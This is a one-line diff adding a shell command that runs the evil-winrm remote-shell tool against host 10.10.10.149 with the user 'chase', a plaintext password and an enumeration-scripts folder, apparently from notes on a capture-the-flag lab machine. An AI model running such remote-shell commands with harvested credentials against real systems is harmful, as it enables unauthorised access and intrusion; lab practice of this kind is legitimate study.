@@ -1,0 +1,1 @@
+ruby evil-winrm.rb -i 10.10.10.149 -u chase -p "Q4)sJu\Y8qz*A3?d" -s enum_scripts/
